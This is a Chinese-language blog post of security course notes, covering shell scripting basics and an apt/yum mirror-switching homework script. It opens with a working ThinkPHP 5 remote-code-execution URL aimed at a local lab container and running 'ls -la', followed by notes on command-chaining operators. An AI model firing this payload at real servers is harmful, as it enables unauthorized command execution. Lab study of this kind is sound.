<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>day11_kls | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="课程内容thinkphp&#x2F;5-rce开启容器后访问http:&#x2F;&#x2F;localhost:8099&#x2F;index.php?s&#x3D;&#x2F;Index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;shell_exec&amp;vars[1][]&#x3D;ls%20-la  命令拼接这里的命令拼接意味一次执行多个命令">
<meta property="og:type" content="article">
<meta property="og:title" content="day11_kls">
<meta property="og:url" content="http://example.com/2024/11/25/day11_kls/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="课程内容thinkphp&#x2F;5-rce开启容器后访问http:&#x2F;&#x2F;localhost:8099&#x2F;index.php?s&#x3D;&#x2F;Index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;shell_exec&amp;vars[1][]&#x3D;ls%20-la  命令拼接这里的命令拼接意味一次执行多个命令">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/assets/image_1732504864187_0.png">
<meta property="article:published_time" content="2024-11-25T14:12:52.000Z">
<meta property="article:modified_time" content="2024-11-25T14:14:42.000Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="kls">
<meta property="article:tag" content="rce">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/assets/image_1732504864187_0.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-day11_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/11/25/day11_kls/" class="article-date">
  <time class="dt-published" datetime="2024-11-25T14:12:52.000Z" itemprop="datePublished">2024-11-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      day11_kls
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2><span id="课程内容">课程内容</span></h2><h3><span id="thinkphpx2f5-rce">thinkphp&#x2F;5-rce</span></h3><p>开启容器后访问<code>http://localhost:8099/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=ls%20-la</code></p>
<p><img src="/../assets/image_1732504864187_0.png" alt="image.png"></p>
<h3><span id="命令拼接">命令拼接</span></h3><p>这里的命令拼接意味一次执行多个命令</p>
<p><code>;</code>执行前面的命令后，接着执行后面的</p>
<p><code>&amp;</code>实际上其是让命令后台运行</p>
<p><code>&amp;&amp;</code>,<code>||</code>实际上这两位是逻辑操作符，尽量避免使用</p>
<p><code>|</code>实际上其是管道符，用户将上一个命令的输出作为下一个命令的输入</p>
<p>妙用echo</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;`ls` `echo 123`&quot;</span><br></pre></td></tr></table></figure>

<h3><span id="shell脚本">shell脚本</span></h3><h4><span id="环境变量">环境变量</span></h4><p><code>PATH</code>可执行程序的路径</p>
<p><code>PWD</code>当前所在的目录</p>
<p><code>SHELL</code>当前使用的shell</p>
<h4><span id="39和quot的区别"><code>&#39;</code>和<code>&quot;</code>的区别</span></h4><p><code>&#39;</code>字符原始数据，<code>&quot;</code>可以解析其中的变量值</p>
<h4><span id="变量定义以及使用">变量定义以及使用</span></h4><p>限定符<code>local</code>当前作用域,<code>export</code>作为环境变量</p>
<p><code>name=value</code>定义</p>
<p><code>$name</code></p>
<h4><span id="参数">参数</span></h4><p>传参<code>fun1 var1 var2</code></p>
<p>处理参数</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fun()&#123;</span><br><span class="line">	echo $1 $2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>特殊的</p>
<p><code>$0</code>为该脚本本身的名字</p>
<p><code>$#</code>：表示传入参数的个数。</p>
<p><code>$@</code>：表示所有传入的参数（以独立形式显示，每个参数都保留为单独的字符串）<br><code>$*</code>：表示所有传入的参数（以一个字符串形式显示，所有参数被合并）</p>
<h4><span id="运算">运算</span></h4><p>算术：</p>
<p><code>expr</code>(不推荐)</p>
<p><code>echo &#39;1+1&#39; | bc</code></p>
<p>(推荐)</p>
<p><code>$(( a + b ))</code></p>
<p><code>let x=a+b</code></p>
<p>字符串：</p>
<p><code>$&#123;#var1&#125;</code>字符串长度</p>
<p><code>$&#123;str:start:end&#125;</code>截取字符串</p>
<p><code>$&#123;str/old/new&#125;</code>替换字符</p>
<h4><span id="流程ifcase">流程if,case</span></h4><p>语法：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if [ condition ]; then</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">commands</span></span><br><span class="line">elif [ another_condition ]; then</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">commands</span></span><br><span class="line">else</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">commands</span></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h4><span id="循环forwhile">循环for,while</span></h4><p>for语法:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for i in $@ ; do</span><br><span class="line">    if [[ condition ]]; then</span><br><span class="line">        continue</span><br><span class="line">    fi</span><br><span class="line">    if [[ condition ]]; then</span><br><span class="line">        break</span><br><span class="line">    fi</span><br><span class="line">    # cmmmands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>while语法:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while [ condition ]; do</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">commands</span></span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4><span id="condition相关">condition相关</span></h4><p>| 特性 | <code>[ ]</code> | <code>[[ ]]</code> | 无括号 |<br>| —- | —- | —- |<br>| <strong>本质</strong> | <code>test</code> 命令 | Bash 内置功能 | 直接执行命令 |<br>| <strong>支持正则表达式</strong> | 不支持 | 支持 | 取决于命令 |<br>| <strong>支持逻辑运算符</strong> | 需要使用 <code>-a</code> 和 <code>-o</code> | 使用 <code>&amp;&amp;</code> 和 &#96; |  |<br>| <strong>变量双引号要求</strong> | 必须加 | 可省略 | 通常不需要 |<br>| <strong>安全性</strong> | 较低（易受空值或特殊字符影响） | 高 | 高 |</p>
<h3><span id="散碎的知识点">散碎的知识点</span></h3><h4><span id="poc">poc</span></h4><p><code>Proof of Concept</code>,漏洞概念验证代码或脚本，用于证明某个漏洞的存在、触发条件以及可能的危害。</p>
<h2><span id="实例ampamp作业">实例&amp;&amp;作业</span></h2><h3><span id="自动更新apt和yum源的脚本">自动更新apt和yum源的脚本</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author: lzf</span><br><span class="line"># feature:</span><br><span class="line">#     1. suport ubuntu,debinen,centos,kali</span><br><span class="line">#     2. backup and restore</span><br><span class="line"># todo:</span><br><span class="line">#     1. yum源更新，仅支持了centos7</span><br><span class="line">#     1. apt源更新，遗漏了部分源</span><br><span class="line"># 帮助</span><br><span class="line">help()&#123;</span><br><span class="line">    echo &quot;$0 update | backup | restore [file_real_path] | list-backup&quot;</span><br><span class="line">&#125;</span><br><span class="line"># 初始化</span><br><span class="line">init()&#123;</span><br><span class="line">    check_depen</span><br><span class="line">    get_os_info</span><br><span class="line">    case $ID in</span><br><span class="line">        ubuntu)</span><br><span class="line">            ;;</span><br><span class="line">        debian)</span><br><span class="line">            ;;</span><br><span class="line">        centos)</span><br><span class="line">            if [ $VERSION_ID != &#x27;7&#x27; ]; then</span><br><span class="line">                echo &quot;Error, Only support centos7.&quot;</span><br><span class="line">                exit 1</span><br><span class="line">            fi</span><br><span class="line">            ;;</span><br><span class="line">        kali)</span><br><span class="line">            ;;</span><br><span class="line">        arch)</span><br><span class="line">            ;;</span><br><span class="line">        *)</span><br><span class="line">            echo &quot;Error: $ID is not supported.&quot;</span><br><span class="line">            exit 1</span><br><span class="line">            ;;</span><br><span class="line">    esac</span><br><span class="line">&#125;</span><br><span class="line"># 获取系统源路径(用于获取备份文件)</span><br><span class="line">get_os_source_path()&#123;</span><br><span class="line">    file_list=()</span><br><span class="line">    case $ID in</span><br><span class="line">        arch)</span><br><span class="line">            file_list+=(&quot;/etc/pacman.d/mirrorlist&quot;)</span><br><span class="line">            ;;</span><br><span class="line">        centos)</span><br><span class="line">            for f in /etc/yum.repos.d/*.repo; do</span><br><span class="line">                file_list+=(&quot;$f&quot;)</span><br><span class="line">            done</span><br><span class="line">            ;;</span><br><span class="line">        *)</span><br><span class="line">            file_list+=(&quot;/etc/apt/sources.list&quot;)</span><br><span class="line">            for f in /etc/apt/sources.list.d/*; do</span><br><span class="line">                if [[ &quot;$f&quot; != *back ]]; then</span><br><span class="line">                    file_list+=(&quot;$f&quot;)</span><br><span class="line">                fi</span><br><span class="line">            done</span><br><span class="line">            ;;</span><br><span class="line">    esac</span><br><span class="line">    if [ -z $1 ]; then</span><br><span class="line">        echo $&#123;file_list[@]&#125;</span><br><span class="line">    elif [ $1 = &quot;backup&quot; ]; then</span><br><span class="line">        new_list=()</span><br><span class="line">        for f in $&#123;file_list[@]&#125;;do</span><br><span class="line">            # 如果文件存在则放入新的数组</span><br><span class="line">            if [ -f $f ]; then</span><br><span class="line">                new_list+=(&quot;$f.back&quot;)</span><br><span class="line">            fi</span><br><span class="line">        done</span><br><span class="line">        echo $&#123;new_list[@]&#125;</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"># 检测依赖软件包</span><br><span class="line">check_depen()&#123;</span><br><span class="line">    local depen=(&quot;ls&quot; &quot;declare&quot;)</span><br><span class="line">    for c in $&#123;depen[@]&#125;; do</span><br><span class="line">        has_cmd $c || &#123;</span><br><span class="line">            echo &quot;Error: $c is not installed.&quot;</span><br><span class="line">            exit 1</span><br><span class="line">        &#125;</span><br><span class="line">    done</span><br><span class="line">&#125;</span><br><span class="line">has_cmd () &#123;</span><br><span class="line">    command -v $1 &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"># 获取当前系统信息</span><br><span class="line">get_os_info()&#123;</span><br><span class="line">    if [ -f /etc/os-release ]; then</span><br><span class="line">        source /etc/os-release</span><br><span class="line">    else</span><br><span class="line">        echo &quot;Error: /etc/os-release not found.&quot;</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"># 备份镜像源(单个文件)</span><br><span class="line">backup_source()&#123;</span><br><span class="line">    if [ -f $1 ]; then</span><br><span class="line">        cp $1 $1.back \</span><br><span class="line">            &amp;&amp; echo &quot;$1 Backup success.Backup file is $1.back&quot; \</span><br><span class="line">            || echo &quot;$1 Backup failed.&quot;</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"># 恢复备份源(单个文件)</span><br><span class="line">restore_source()&#123;</span><br><span class="line">    backup_file_path=$1</span><br><span class="line">    if [ -f $backup_file_path ]; then</span><br><span class="line">        file_postfix=$&#123;backup_file_path:($&#123;#backup_file_path&#125;-4):$&#123;#backup_file_path&#125;&#125;</span><br><span class="line">        origin_file_path=$&#123;backup_file_path:0:($&#123;#backup_file_path&#125;-5)&#125;</span><br><span class="line">        echo $file_postfix</span><br><span class="line">        echo $origin_file_path</span><br><span class="line">        if [ $&#123;backup_file_path:($&#123;#backup_file_path&#125;-4):$&#123;#backup_file_path&#125;&#125; = &#x27;back&#x27; ]; then</span><br><span class="line">            if [ -f $origin_file_path ]; then</span><br><span class="line">                rm $origin_file_path</span><br><span class="line">            fi</span><br><span class="line">            cp $backup_file_path $origin_file_path \</span><br><span class="line">                &amp;&amp; echo &quot;$backup_file_path Restore success.Restore file is $origin_file_path&quot; \</span><br><span class="line">                || echo &quot;$backup_file_path Restore failed.&quot;</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"># 列出所有备份文件</span><br><span class="line">list_backup_source()&#123;</span><br><span class="line">    files=`get_os_source_path back`</span><br><span class="line">    if [ -z $files ];then</span><br><span class="line">        return 0</span><br><span class="line">    else</span><br><span class="line">        for file in $files; do</span><br><span class="line">            echo backup_file: `realpath $file`</span><br><span class="line">        done</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"># 备份源</span><br><span class="line">backup()&#123;</span><br><span class="line">    case $ID in</span><br><span class="line">        centos)</span><br><span class="line">            p=`get_os_source_path backup`</span><br><span class="line">            echo $p</span><br><span class="line">            for f in ls $p ; do</span><br><span class="line">                backup_source $f</span><br><span class="line">            done</span><br><span class="line">            ;;</span><br><span class="line">        arch)</span><br><span class="line">            echo &quot;正在编写代码，暂时不支持$ID&quot;</span><br><span class="line">            exit 1</span><br><span class="line">            ;;</span><br><span class="line">        *)</span><br><span class="line">            echo `get_os_source_path`</span><br><span class="line">            for f in `get_os_source_path`; do</span><br><span class="line">                backup_source $f</span><br><span class="line">            done</span><br><span class="line">            ;;</span><br><span class="line">    esac</span><br><span class="line">&#125;</span><br><span class="line"># 对源文件进行sed操作</span><br><span class="line">sed_list()&#123;</span><br><span class="line">    for f in `get_os_source_path`; do</span><br><span class="line">        echo &quot;正在为$&#123;f&#125;进行sed操作...&quot;</span><br><span class="line">        sed -i &quot;$1&quot; $f</span><br><span class="line">    done</span><br><span class="line">&#125;</span><br><span class="line"># apt更新</span><br><span class="line">update_apt()&#123;</span><br><span class="line">    apt update \</span><br><span class="line">        &amp;&amp; echo &quot;Update success.&quot; \</span><br><span class="line">        || echo &quot;Update failed.&quot;</span><br><span class="line">&#125;</span><br><span class="line"># 换源</span><br><span class="line">change_source()&#123;</span><br><span class="line">    case $ID in</span><br><span class="line">        ubuntu)</span><br><span class="line">            sed_list &quot;s@//.*archive.ubuntu.com@//mirrors.aliyun.com@g&quot;</span><br><span class="line">            update_apt</span><br><span class="line">            ;;</span><br><span class="line">        debian)</span><br><span class="line">            sed_list &quot;s@http://\(deb.debian.org\|archive.debian.org\)@https://mirrors.aliyun.com@g&quot;</span><br><span class="line">            update_apt</span><br><span class="line">            ;;</span><br><span class="line">        centos)</span><br><span class="line">            if [ $VERSION_ID -eq &#x27;7&#x27; ] ;then</span><br><span class="line">                # todo</span><br><span class="line">                curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">                curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo</span><br><span class="line">                sed -i &#x27;s/http:\/\/mirrors.cloud.aliyuncs.com/url_tmp/g&#x27;  /etc/yum.repos.d/CentOS-Base.repo &amp;&amp;  sed -i &#x27;s/http:\/\/mirrors.aliyun.com/http:\/\/mirrors.cloud.aliyuncs.com/g&#x27; /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; sed -i &#x27;s/url_tmp/http:\/\/mirrors.aliyun.com/g&#x27; /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line">                yum clean all &amp;&amp; yum makecache \</span><br><span class="line">                    &amp;&amp; echo &quot;Update success.&quot; \</span><br><span class="line">                    || echo &quot;Update failed.&quot;</span><br><span class="line">            fi</span><br><span class="line">            ;;</span><br><span class="line">        kali)</span><br><span class="line">            sed_list &quot;s@http://http.kali.org@https://mirrors.aliyun.com@g&quot;</span><br><span class="line">            update_apt</span><br><span class="line">            ;;</span><br><span class="line">        arch)</span><br><span class="line">            echo &quot;正在编写代码，暂时不支持$ID&quot;</span><br><span class="line">            exit 1</span><br><span class="line">            ;;</span><br><span class="line">    esac</span><br><span class="line">&#125;</span><br><span class="line">main()&#123;</span><br><span class="line">    init</span><br><span class="line">    #ID=&quot;centos&quot;</span><br><span class="line">    if [ $# -eq 0 ]; then</span><br><span class="line">        backup</span><br><span class="line">        change_source</span><br><span class="line">    else</span><br><span class="line">        case $1 in</span><br><span class="line">            &quot;update&quot;)</span><br><span class="line">                backup</span><br><span class="line">                change_source</span><br><span class="line">                ;;</span><br><span class="line">            &quot;backup&quot;)</span><br><span class="line">                backup</span><br><span class="line">                ;;</span><br><span class="line">            &quot;restore&quot;)</span><br><span class="line">                if [ -f $2 ]; then</span><br><span class="line">                    restore_source $2</span><br><span class="line">                else</span><br><span class="line">                    echo &quot;Error: $2 not found.&quot;</span><br><span class="line">                fi</span><br><span class="line">                ;;</span><br><span class="line">            &quot;list-backup&quot;)</span><br><span class="line">                list_backup_source</span><br><span class="line">                ;;</span><br><span class="line">            *)</span><br><span class="line">                help</span><br><span class="line">                ;;</span><br><span class="line">        esac</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">main $@</span><br></pre></td></tr></table></figure>

<h2><span id="思考ampamptodo">思考&amp;&amp;todo</span></h2><h2><span id="参考">参考</span></h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/11/25/day11_kls/" data-id="cm45lne020004s8iw1x864az4" data-title="day11_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/rce/" rel="tag">rce</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2024/11/26/day12_kls/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          day12_kls
        
      </div>
    </a>
  
  
    <a href="/2024/11/23/day10_kls_review/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">day10_kls_review</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/burpsuite/" rel="tag">burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cookie/" rel="tag">cookie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker-compose/" rel="tag">docker-compose</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa/" rel="tag">dvwa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exam/" rel="tag">exam</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/firewalld/" rel="tag">firewalld</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/" rel="tag">http</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/" rel="tag">linux常见服务</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/review/" rel="tag">review</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/selinux/" rel="tag">selinux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/session/" rel="tag">session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/" rel="tag">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-copy-id/" rel="tag">ssh-copy-id</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sysinfo/" rel="tag">sysinfo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ufw/" rel="tag">ufw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virt-manager/" rel="tag">virt-manager</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" rel="tag">虚拟化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/burpsuite/" style="font-size: 10px;">burpsuite</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/docker/" style="font-size: 13.33px;">docker</a> <a href="/tags/docker-compose/" style="font-size: 13.33px;">docker-compose</a> <a href="/tags/dvwa/" style="font-size: 10px;">dvwa</a> <a href="/tags/exam/" style="font-size: 13.33px;">exam</a> <a href="/tags/firewalld/" style="font-size: 10px;">firewalld</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/http/" style="font-size: 13.33px;">http</a> <a href="/tags/iptables/" style="font-size: 10px;">iptables</a> <a href="/tags/kls/" style="font-size: 20px;">kls</a> <a href="/tags/linux/" style="font-size: 16.67px;">linux</a> <a href="/tags/linux%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/" style="font-size: 10px;">linux常见服务</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/review/" style="font-size: 13.33px;">review</a> <a href="/tags/selinux/" style="font-size: 10px;">selinux</a> <a href="/tags/session/" style="font-size: 10px;">session</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/smb/" style="font-size: 10px;">smb</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/ssh-copy-id/" style="font-size: 10px;">ssh-copy-id</a> <a href="/tags/sysinfo/" style="font-size: 10px;">sysinfo</a> <a href="/tags/ufw/" style="font-size: 10px;">ufw</a> <a href="/tags/virt-manager/" style="font-size: 10px;">virt-manager</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" style="font-size: 10px;">虚拟化</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 